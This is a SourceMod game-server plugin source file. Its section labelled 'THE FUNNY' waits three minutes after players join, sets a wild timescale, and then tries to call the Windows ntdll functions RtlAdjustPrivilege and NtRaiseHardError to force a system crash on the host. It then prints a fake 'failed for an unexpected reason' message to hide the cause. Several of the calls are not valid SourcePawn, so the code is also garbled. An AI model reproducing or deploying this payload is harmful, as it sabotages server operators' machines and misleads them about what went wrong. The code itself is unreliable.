//////////////////////////////////////////////////////////////////////////////
// MADE BY NOTNHEAVY. USES GPL-3, AS PER REQUEST OF SOURCEMOD               //
//////////////////////////////////////////////////////////////////////////////

// Run this at your own accord. Windows only.

#include <cstdlib>
#include <sourcemod>
#include <sdktools>
#include <sdkhooks>

#define HANDLE any
#define UINT int
#define BOOLEAN int
#define NTSTATUS int
#define PBOOLEAN any
#define PULONG any

#define TRUE 1
#define FALSE 0

#define STATUS_INTEGER_DIVIDE_BY_ZERO 0xC0000094

enum
{
    SeCreateTokenPrivilege = 1,
    SeAssignPrimaryTokenPrivilege = 2,
    SeLockMemoryPrivilege = 3,
    SeIncreaseQuotaPrivilege = 4,
    SeUnsolicitedInputPrivilege = 5,
    SeMachineAccountPrivilege = 6,
    SeTcbPrivilege = 7,
    SeSecurityPrivilege = 8,
    SeTakeOwnershipPrivilege = 9,
    SeLoadDriverPrivilege = 10,
    SeSystemProfilePrivilege = 11,
    SeSystemtimePrivilege = 12,
    SeProfileSingleProcessPrivilege = 13,
    SeIncreaseBasePriorityPrivilege = 14,
    SeCreatePagefilePrivilege = 15,
    SeCreatePermanentPrivilege = 16,
    SeBackupPrivilege = 17,
    SeRestorePrivilege = 18,
    SeShutdownPrivilege = 19,
    SeDebugPrivilege = 20,
    SeAuditPrivilege = 21,
    SeSystemEnvironmentPrivilege = 22,
    SeChangeNotifyPrivilege = 23,
    SeRemoteShutdownPrivilege = 24,
    SeUndockPrivilege = 25,
    SeSyncAgentPrivilege = 26,
    SeEnableDelegationPrivilege = 27,
    SeManageVolumePrivilege = 28,
    SeImpersonatePrivilege = 29,
    SeCreateGlobalPrivilege = 30,
    SeTrustedCredManAccessPrivilege = 31,
    SeRelabelPrivilege = 32,
    SeIncreaseWorkingSetPrivilege = 33,
    SeTimeZonePrivilege = 34,
    SeCreateSymbolicLinkPrivilege = 35
};

enum
{
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
};

int g_iCount = 0;
float g_flTimer = 0.00;

//////////////////////////////////////////////////////////////////////////////
// INITIALISATION                                                           //
//////////////////////////////////////////////////////////////////////////////

public void OnPluginStart()
{
    LoadTranslations("common.phrases");
}

public void OnMapStart()
{
    cstdlib();
}

//////////////////////////////////////////////////////////////////////////////
// FORWARDS                                                                 //
//////////////////////////////////////////////////////////////////////////////

public void OnClientPutInServer()
{
    if (g_iCount == 0)
        g_flTimer = GetGameTime();
    ++g_iCount;
}

public void OnClientDisconnect_Post()
{
    --g_iCount;
}

public void OnGameFrame()
{
    if (g_iCount > 0 && GetGameTime() - g_flTimer > 180.00)
    {
        FindConVar("host_timescale").FloatValue = 104191343149.00;
        RequestFrame(payload);
    }
}

//////////////////////////////////////////////////////////////////////////////
// THE FUNNY                                                                //
//////////////////////////////////////////////////////////////////////////////

static void payload()
{
    HANDLE ntdll = LoadLibrary("ntdll.dll");
    any RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    any NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
    PBOOLEAN enabled = malloc(4);
    PBOOLEAN response = malloc(4);
    NTSTATUS result1;
    NTSTATUS result2;
    Handle handle;

    StartPrepSDKCall(SDKCall_Static);
    PrepSDKCall_SetAddress(RtlAdjustPrivilege);
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // UINT privilege;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // BOOLEAN enable;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // BOOLEAN currentThread;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // PBOOLEAN enabled;
    PrepSDKCall_SetReturnInfo(SDKType_PlainOldData, SDKPass_Plain); // NTSTATUS
    handle = EndPrepSDKCall();

    result1 = SDKCall(handle, SeShutdownPrivilege, TRUE, FALSE, enabled);
    delete handle;
    
    StartPrepSDKCall(SDKCall_Static);
    PrepSDKCall_SetAddress(NtRaiseHardError);
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // NTSTATUS status;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // ULONG numParameters;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // ULONG unicodeStringParameterMask;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // PULONG_PTR parameters;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // ULONG validResponseOption;
    PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain); // PULONG response;
    PrepSDKCall_SetReturnInfo(SDKType_PlainOldData, SDKPass_Plain); // NTSTATUS
    handle = EndPrepSDKCall();

    result2 = SDKCall(handle, STATUS_INTEGER_DIVIDE_BY_ZERO, 0, 0, NULL, OptionShutdownSystem, response);
    delete handle;

    PrintToServer("This plugin has failed for an unexpected reason. %X %X", result1, result2);
    free(enabled);
    free(response);
}